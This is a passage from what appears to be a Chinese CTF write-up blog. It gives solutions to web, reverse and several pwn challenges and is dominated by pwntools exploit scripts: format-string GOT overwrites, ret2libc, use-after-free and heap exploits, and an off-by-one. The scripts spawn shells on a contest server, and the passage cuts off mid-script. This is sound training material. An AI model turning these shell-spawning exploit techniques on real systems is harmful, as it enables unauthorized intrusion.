class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + <span class="string">&#x27;bb%396$p&#x27;</span></span><br><span class="line">echo(payload)</span><br><span class="line"><span class="built_in">print</span> r.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">init_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">code_base = init_addr - <span class="number">0xda0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;code base:&quot;</span>, <span class="built_in">hex</span>(code_base)</span><br><span class="line">free_got = code_base + elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free got:&quot;</span>, <span class="built_in">hex</span>(free_got)</span><br><span class="line">num = (system &amp; <span class="number">0xFFFF</span>) - padding_num - <span class="number">0x16</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num + padding_num)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + (<span class="string">&#x27;bb%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%133$hn&#x27;</span>).ljust(<span class="number">16</span>, <span class="string">&#x27;a&#x27;</span>) + p64(free_got)</span><br><span class="line">echo(payload)</span><br><span class="line">num = ((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>) - padding_num - <span class="number">0x16</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num + padding_num)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + (<span class="string">&#x27;bb%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%133$hn&#x27;</span>).ljust(<span class="number">16</span>, <span class="string">&#x27;a&#x27;</span>) + p64(free_got + <span class="number">2</span>)</span><br><span class="line">echo(payload)</span><br><span class="line">setName(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109210548794.png" alt="image-20210109210548794"></p>
<h1 id="岁末赛"><a href="#岁末赛" class="headerlink" title="岁末赛"></a>岁末赛</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h3><p>查看js文件</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234340494.png" alt="image-20201226234340494"></p>
<p>发现是aa编码，解码后搜索拼接flag。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234527467.png" alt="image-20201226234527467"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234537966.png" alt="image-20201226234537966"></p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>ida打开，转字符。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234752145.png" alt="image-20201226234752145"></p>
<h3 id="zzzz3333333"><a href="#zzzz3333333" class="headerlink" title="zzzz3333333"></a>zzzz3333333</h3><p>ida打开，分析代码。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234935822.png" alt="image-20201226234935822"></p>
<p>flag应该满足一个38元一次方程，使用python编写脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> fsolve</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">    <span class="number">48</span> * a1[<span class="number">7</span>]</span><br><span class="line">    + a1[<span class="number">5</span>] *<span class="number">64</span> </span><br><span class="line">    + <span class="number">4</span> * a1[<span class="number">4</span>]</span><br><span class="line">    + <span class="number">59</span> * a1[<span class="number">1</span>]</span><br><span class="line">    + <span class="number">85</span> * a1[<span class="number">0</span>]</span><br><span class="line">    + <span class="number">76</span> * a1[<span class="number">2</span>]</span><br><span class="line">    + <span class="number">65</span> * a1[<span class="number">3</span>]</span><br><span class="line">    + <span class="number">50</span> * a1[<span class="number">6</span>]</span><br><span class="line">    + <span class="number">11</span> * a1[<span class="number">8</span>]</span><br><span class="line">    + <span class="number">66</span> * a1[<span class="number">9</span>] - <span class="number">44858</span> ,…………………………………………………………]</span><br><span class="line">r = fsolve(func,[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">print(<span class="built_in">type</span>(r))</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">    print(i)</span><br><span class="line">    a += <span class="built_in">chr</span>(<span class="built_in">round</span>(i))</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226222137424.png" alt="image-20201226222137424"></p>
<p>buf可以覆盖v4为123。</p>
<p>利用strncmp与strlen函数的特性，strlen遇到<code>\x00</code>停止，strncmp如果比较长度为0，则返回0.buf开始输入<code>\x00</code>即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p32(<span class="number">123</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226222724458.png" alt="image-20201226222724458"></p>
<p>和pwn1相比，多一个栈溢出的步骤，将v4覆盖为足够大的值就有一个足够的范围进行栈溢出。栈溢出就是基础的ret2libc的方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;219.219.61.234&quot;,10001)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line">main = <span class="number">0x80484e0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&quot;you_really_know_random_haha&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">print(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;you_really_know_random_haha&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(system_addr)+p32(main)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226223249375.png" alt="image-20201226223249375"></p>
<p>存在UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226223348994.png" alt="image-20201226223348994"></p>
<p>能控制创建chunk的大小，结合UAF，可以使用fastbin attack。</p>
<p>攻击步骤：</p>
<ul>
<li>创建node0，node1，大小大于fastbin。</li>
<li>delete node0，node1,node0，node1的0x8大小的chunk依次进入fastbin</li>
<li>创建node2，大小为0x8，node0 的0x8的chunk就成为node2的content。</li>
<li>修改node2就可以修改node0的content指针，修改为后门函数。</li>
<li>show（0），执行后门函数。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226235810722.png" alt="image-20201226235810722"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226235930598.png" alt="image-20201226235930598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000129738.png" alt="image-20201227000129738"></p>
<p>如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234136178.png" alt="image-20201226234136178"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;219.219.61.234&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(<span class="number">0x8048986</span>)</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>结构体如图：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226224230366.png" alt="image-20201226224230366"></p>
<p>存在UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226224043185.png"></p>
<p>如果能够修改一个存在的结构体的name指针为某个函数的got表项，那么就可以泄露地址、修改got表项，获得shell。</p>
<p>也就是说，现在需要创建一个结构体，其name指针指向的chunk覆盖其他结构体的*name指针。</p>
<p>name指针所在的chunk恒为0x20，属于fastbin一般来讲free掉后是进入fastbin的，而创建chunk限制了大小，必须大于127个字节.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226224913086.png" alt="image-20201226224913086"></p>
<p>所以，需要让fastbin里的chunk与其他chunk合并。而<strong>当free的堆块大小大于fastbin中的最大size时，fastbin里的所有chunk会合并</strong>.</p>
<p>因此攻击步骤为：</p>
<ul>
<li>创建index0，1，申请的chunk大于fastbin中的最大size，比如0x200</li>
<li>free index0，这样index0的0x20的chunk进入fastbin，0x200的chunk进入unsortedbin。</li>
<li>free index1，过程是先free0x200的chunk，因此fastbin里的chunk合并，与index0的0x200chunk合并进入unsortedbin。index1的0x20chunk进入fastbin。</li>
<li>创建index2，大小大于fastbin，从unsortedbin中获得。此时修改index2的name就是在修改index0的size和*name。</li>
<li>修改index0的*name为got表项，利用输出函数泄露地址，然后修改got表指向的内容为system获得shell。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000348168.png" alt="image-20201227000348168"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000436630.png" alt="image-20201227000436630"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000459417.png" alt="image-20201227000459417"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn4&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;important secret\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atol = elf.got[<span class="string">&quot;atol&quot;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">#这里先是修改index0的size大小，因此注意别改的太小。</span></span><br><span class="line">payload = p64(<span class="number">200</span>) + p64(atol)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atol_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=atol_addr-libc.symbols[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">print(<span class="built_in">hex</span>(system))</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>这道题和HITCON Trainging lab13一样。。。</p>
<p>存在offbyone漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226230931072.png" alt="image-20201226230931072"></p>
<p>利用过程如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226233114636.png" alt="image-20201226233114636"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000901836.png" alt="image-20201227000901836"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000949698.png" alt="image-20201227000949698"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227001329838.png" alt="image-20201227001329838"></p>
<p>这样就可以修改new chunk1的内容指针为got表项，进行地址泄露和got表修改。</p>
<p>需要注意的是，题目给的libc似乎有点问题，LibcSearcher也不怎么靠谱，最后根据泄露地址的后三位，在libc database search中查询得到偏移。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn5&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10004</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn5&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">head = <span class="number">0x0000000006020a0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) +p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot;OK!&quot;</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">base = free_addr - <span class="number">0x084540</span></span><br><span class="line"><span class="comment"># base = free_addr-libc.symbols[&quot;free&quot;]</span></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]+base</span></span><br><span class="line">system_addr = <span class="number">0x0453a0</span>+base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h3><p>和pwn4一样，区别在于没有给libc，需要先确定libc。本来是用LibcSearcher，发现效果不好。就根据泄露地址后三位，在libc database search中查询得到偏移。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn6&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10005</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;important secret\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">atol = elf.got[<span class="string">&quot;atol&quot;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">#这里先是修改index0的size大小，因此注意别改的太小。</span></span><br><span class="line">payload = p64(<span class="number">200</span>) + p64(atol)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atol_addr = u64(p.recv(<span class="number">6</span>).ljust(<span 